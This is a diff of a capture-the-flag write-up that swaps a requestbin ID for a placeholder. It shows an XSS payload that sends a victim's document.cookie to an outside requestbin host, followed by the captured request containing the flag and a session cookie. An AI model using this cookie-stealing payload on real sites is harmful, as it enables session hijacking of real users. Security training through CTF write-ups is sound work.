@@ -28,14 +28,14 @@ that we must steal their cookie. The following payload sends the cookies to our 
 
 ```js
 <script>
-document.location='http://requestbin.net/r/18cbjfi1?c=' + document.cookie;
+document.location='http://requestbin.net/r/YOUR_BIN?c=' + document.cookie;
 </script>
 ```
 
 The requestbin showed the following request:
 
 ```
-GET /r/18cbjfi1?c=flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV
+GET /r/YOUR_BIN?c=flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV
 ```
 
 Therefore the flag was `CTF{8aaa2f34b392b415601804c2f5f0f24e}`
